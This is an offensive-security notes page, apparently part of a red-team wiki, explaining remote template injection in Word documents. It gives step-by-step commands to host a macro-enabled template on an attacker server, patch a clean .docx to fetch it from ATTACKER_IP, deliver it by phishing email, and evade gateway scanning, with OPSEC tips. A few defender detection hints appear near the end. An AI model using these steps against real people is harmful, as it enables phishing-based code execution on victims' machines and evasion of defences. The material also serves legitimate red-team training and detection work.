**Remote template injection** — deliver a completely **clean** `.docx` (no macros, no payload in the file itself) that secretly references a Word template stored on your server over HTTP. When the victim opens the document, Word reaches out, downloads that template — a macro-enabled `.dotm` — and runs *its* macros. Because the file you actually send is benign, it often sails past static mail-gateway detection, splitting your payload off from the delivered document.

```
attacker hosts template.dotm on HTTP server
victim opens clean.docx (no macros inside)
Word -> GET http://attacker/template.dotm
Word runs template's AutoOpen() macro -> payload
```

## How it works

A `.docx` is a ZIP. The relationship file `word/_rels/settings.xml.rels` records the attached template's location. Point that `Target` at an attacker URL hosting a macro-enabled `.dotm`, and opening the `.docx` triggers an outbound fetch + macro execution.

**Note:** MOTW still applies to the downloaded `.docx` - the template's macros are subject to the same "macros blocked by default" rule. Value is in *evasion of static detection* and splitting the payload off the delivered file, not in bypassing MOTW. Pair with a channel that avoids MOTW where needed.

## Setup

1. Build a macro-enabled template `template.dotm` with a `Document_Open()`/`AutoOpen()` macro - see [Malicious Office Macros (VBA)](Malicious%20Office%20Macros%20%28VBA%29.md). Host it:

```bash

python3 -m http.server 80   # serves http://ATTACKER_IP/template.dotm

```

2. Inject the reference into a clean `.docx`. Manually:

```bash

mkdir docx && cd docx && unzip ../clean.docx
# edit word/_rels/settings.xml.rels: set the template relationship Target to the URL, TargetMode="External"
#   Target="http://ATTACKER_IP/template.dotm"
zip -r ../evil.docx .

```

Or with tooling:

```bash

# remoteinjector - patches a docx to point at a remote template
remoteinjector -w 'http://ATTACKER_IP/template.dotm' clean.docx
# phishing (Sensepost) or docx-thief also automate creation

```

## Delivery

- Attach `evil.docx` to the pretext email - it contains no macro, so gateway macro-scanners find nothing.
- Watch your web server: the template GET confirms the victim opened the document (useful as a tracking signal too).

## Detection & OPSEC

- The tell is a Word process making an **outbound HTTP request for a `.dotm`** immediately on document open - a strong hunt for defenders (proxy logs, `WINWORD.EXE` network egress).
- Use HTTPS and a categorized domain; the template URL is visible to anyone who unzips the `.docx`.
- Blue team: inspect `word/_rels/settings.xml.rels` for `TargetMode="External"`; `olevba`/`oletools` flag remote templates.

## References

- The Hacker Recipes - Initial access (phishing) - https://www.thehacker.recipes/infra/phishing
- remoteinjector - https://github.com/JohnWoodman/remoteInjector
- SensePost - phishing (Word/remote template) - https://github.com/sensepost/phishing
- EvilClippy - https://github.com/outflanknl/EvilClippy
